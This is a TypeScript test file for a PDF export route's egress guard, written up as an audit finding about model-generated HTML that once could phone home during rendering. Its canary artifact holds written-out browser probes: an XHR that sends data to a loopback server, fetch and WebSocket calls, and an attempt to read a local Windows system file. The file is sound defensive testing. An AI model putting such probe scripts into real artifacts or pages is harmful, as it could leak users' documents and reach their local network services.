/**
 * AUDIT FINDING 7 (2026-11-06) — the PDF export trust boundary.
 *
 * `POST /api/documents/pdf` takes the ```html fence body VERBATIM (raw model
 * output) and rendered it in headless Chromium with JavaScript and the network
 * enabled, waiting for `networkidle`. So an artifact could, at the moment the
 * user clicked "Export as PDF", run code ON THE USER'S OWN MACHINE that:
 *   - phoned home to the WAN, taking the document's own text with it,
 *   - made loopback/LAN requests (the Rust backend :3101, the local model
 *     endpoint :8080, any router or NAS on the network), and
 *   - held a socket open until the 45 s render timeout expired.
 *
 * These tests are the canary for the repair in lib/documents/renderGuard.ts.
 * They stand up a REAL loopback HTTP server and prove the render never touched
 * it (server-side evidence — the strongest form, independent of what the
 * artifact reports about itself) while also proving the render still runs its
 * own scripts and still loads `data:` images (the feature is preserved, not
 * lobotomised). No dev server, no model traffic: fully deterministic, safe to
 * re-run in a fix loop.
 */
import http from "node:http";
import crypto from "node:crypto";
import type { AddressInfo } from "node:net";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import { NextRequest } from "next/server";
import { POST } from "@/app/api/documents/pdf/route";
import { renderPdf, renderChartPng } from "@/lib/documents/pdfEngine";
import { chartHtmlDocument } from "@/lib/documents/chartHtml";
import { pdfText } from "@/lib/server/extract/pdf";

/** Marker the canary server serves. If it ever appears in the PDF, the guard failed. */
const SECRET = "PDF-CANARY-" + crypto.randomUUID();

let server: http.Server;
let base = "";
/** Every request path the canary server actually received. Reset per test. */
let seen: string[] = [];

beforeAll(async () => {
  server = http.createServer((req, res) => {
    seen.push(req.url ?? "");
    if (req.url?.startsWith("/hang")) return; // never responds: the stall probe
    res.writeHead(200, {
      "Content-Type": "text/plain",
      // CORS-wide ON PURPOSE. A cross-origin block would mask a leak by making
      // the body unreadable, so the canary deliberately removes that excuse:
      // pre-repair, the artifact could fetch AND read this body.
      "Access-Control-Allow-Origin": "*",
    });
    res.end(SECRET);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  base = "http://127.0.0.1:" + (server.address() as AddressInfo).port;
});

afterAll(async () => {
  // Drop any socket still held open by a /hang probe before exiting the worker.
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

afterEach(() => {
  seen = [];
});

/**
 * The probe artifact. Note the SYNCHRONOUS XHR: its outcome is in the DOM
 * before the parser finishes, so the printed text is deterministic — no race
 * between an async probe and the moment Chromium prints. The async probes
 * (fetch/WebSocket) are asserted only in their race-safe form ("the secret is
 * absent", "the socket never opened") with the server-side `seen` ledger
 * carrying the hard proof.
 */
function canaryArtifact(): string {
  return [
    "<div id=\"r\">egress canary</div>",
    "<script>",
    "function line(t){var d=document.createElement('div');d.className='probe';d.textContent=t;document.body.appendChild(d);}",
    "line('JS-EXECUTED');",
    "try{var x=new XMLHttpRequest();x.open('GET','" + base + "/secret?d='+encodeURIComponent('EXFIL-PAYLOAD'),false);x.send();",
    "line('XHR:'+(x.responseText&&x.responseText.indexOf('" + SECRET + "')>=0?'READ-SECRET':'EMPTY'));}catch(e){line('XHR:BLOCKED');}",
    "fetch('" + base + "/secret').then(function(r){return r.text()}).then(function(t){line('FETCH:'+(t.indexOf('" + SECRET + "')>=0?'READ-SECRET':'EMPTY'));}).catch(function(){line('FETCH:BLOCKED');});",
    "try{var w=new WebSocket('ws://" + base.replace("http://", "") + "/');w.onopen=function(){line('WS:OPEN');w.close();};w.onerror=function(){line('WS:BLOCKED');};}catch(e){line('WS:BLOCKED');}",
    "fetch('file:///c:/Windows/win.ini').then(function(r){return r.text()}).then(function(){line('FILE:READ');}).catch(function(){line('FILE:BLOCKED');});",
    "var i=new Image();i.onload=function(){line('DATAIMG:OK');};i.onerror=function(){line('DATAIMG:FAILED');};",
    "i.src='data:image/svg+xml;utf8,'+encodeURIComponent(\"<svg xmlns='http://www.w3.org/2000/svg' width='8' height='8'><rect width='8' height='8' fill='#0a0'/></svg>\");",
    "<\/script>",
  ].join("\n");
}

async function exportPdf(spec: unknown) {
  const req = new NextRequest("http://localhost:3000/api/documents/pdf", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ spec }),
  });
  const res = await POST(req);
  return { res, buffer: Buffer.from(await res.arrayBuffer()) };
}

describe("PDF export egress boundary (finding 7)", () => {
  it(
    "a model artifact cannot reach the network, loopback or a local file — and cannot leak the document",
    async () => {
      const started = Date.now();
      const { res, buffer } = await exportPdf(canaryArtifact());
      const elapsed = Date.now() - started;

      expect(res.status).toBe(200);
      expect(buffer.subarray(0, 5).toString()).toBe("%PDF-");

      const { text } = await pdfText(buffer);
      // The canary really ran inside the render (JS stays on deliberately — the
      // privilege being removed is EGRESS, not computation).
      expect(text).toContain("JS-EXECUTED");
      // The strongest, race-free proof: the loopback server received NOTHING.
      // Not one XHR, fetch, WebSocket handshake or upgrade reached it, so there
      // was nothing to leak and no SSRF against loopback/LAN either.
      //
      // This is a REAL regression gate, not a vacuous pass: with the guard
      // removed from renderPdf on 2026-11-06 the ledger came back
      // ["/secret?d=EXFIL-PAYLOAD", "/secret", "/"] — the document's own data
      // in a query string, a second plain fetch, and the WebSocket upgrade that
      // only `offline: true` stops (Playwright's route layer never sees it).
      expect(seen).toEqual([]);
      // Deterministic sync probe: refused, and it never read the secret.
      expect(text).toContain("XHR:BLOCKED");
      expect(text).not.toContain("READ-SECRET");
      expect(text).not.toContain(SECRET);
      expect(text).not.toContain("EXFIL-PAYLOAD");
      // Race-safe async assertions.
      expect(text).not.toContain("WS:OPEN");
      expect(text).not.toContain("FILE:READ");
      // A `data:` image still loads: local/inline content is untouched.
      expect(text).toContain("DATAIMG:OK");
      // The route reports the guard's count (a count only — never the URLs or
      // the artifact's contents) so a phoning-home export stays observable.
      const blocked = res.headers.get("x-pdf-blocked-requests");
      expect(blocked, "missing the blocked-request counter header").not.toBeNull();
      expect(Number(blocked)).toBeGreaterThanOrEqual(1);
      // The networkidle stall vector is closed: this artifact tries four sockets.
      expect(elapsed).toBeLessThan(20_000);
    },
    90_000,
  );

  it("an artifact that reaches for nothing exports with a clean guard count", async () => {
    const doc = [
      "<h1>Quarterly Operations Summary</h1>",
      "<div id=\"r\">plain</div>",
      "<script>document.getElementById('r').textContent='INLINE-SCRIPT-OK';<\/script>",
    ].join("\n");
    const { res, buffer } = await exportPdf(doc);
    const { text } = await pdfText(buffer);
    expect(text).toContain("Quarterly Operations Summary");
    // JS still runs, so inline-script artifacts keep working in their PDF.
    expect(text).toContain("INLINE-SCRIPT-OK");
    expect(seen).toEqual([]);
    expect(res.headers.get("x-pdf-blocked-requests")).toBe("0");
  });

  it("a hanging endpoint cannot stall the export to the 45 s render timeout", async () => {
    const started = Date.now();
    const out = await renderPdf(
      [
        "<div id=\"r\">stall probe</div>",
        "<script>",
        "fetch('" + base + "/hang').catch(function(){});",
        "try{new WebSocket('ws://" + base.replace("http://", "") + "/hang')}catch(e){}",
        "var d=document.createElement('div');d.textContent='MARKER-RENDERED';document.body.appendChild(d);",
        "<\/script>",
      ].join("\n"),
      "stall",
    );
    const elapsed = Date.now() - started;
    const { text } = await pdfText(out.buffer);
    expect(text).toContain("MARKER-RENDERED");
    // Pre-repair this turn sat on an open socket until networkidle timed out.
    expect(elapsed).toBeLessThan(20_000);
  });

  it("the guarded chart path still loads its own temp file and screenshots it", async () => {
    const html = chartHtmlDocument(
      { type: "bar", title: "Guarded Chart", categories: ["A", "B"], series: [{ name: "S", data: [4, 9] }] },
      { width: 420, height: 300, theme: "dark" },
    );
    const shot = await renderChartPng(html, { width: 420, height: 300, scale: 2 });
    expect(shot.buffer.subarray(1, 4).toString("latin1")).toBe("PNG");
    expect(shot.width).toBeGreaterThanOrEqual(420);
    expect(seen).toEqual([]);
  }, 90_000);
});
